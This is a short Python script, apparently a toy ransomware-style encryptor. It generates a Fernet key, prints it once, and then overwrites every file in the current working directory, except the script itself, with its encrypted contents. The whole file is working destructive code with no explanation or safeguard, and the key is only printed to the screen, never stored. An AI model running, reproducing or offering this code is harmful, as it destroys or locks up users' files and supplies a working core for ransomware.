import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher_suite = Fernet(key)

print(key)


cur_dir = os.getcwd()
print("Current working directory: ", cur_dir )

for filename in os.listdir(cur_dir):
    if filename != os.path.basename(__file__):
        file_name = os.path.basename(filename)
        if os.path.isfile(filename):
            with open(filename, 'rb') as file:
                file_data = file.read()
            
            #encrypt the data
            encrypted_data = cipher_suite.encrypt(file_data)
            with open(filename, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)
            
            print(f"File '{file_name}' has been encryped :O ")

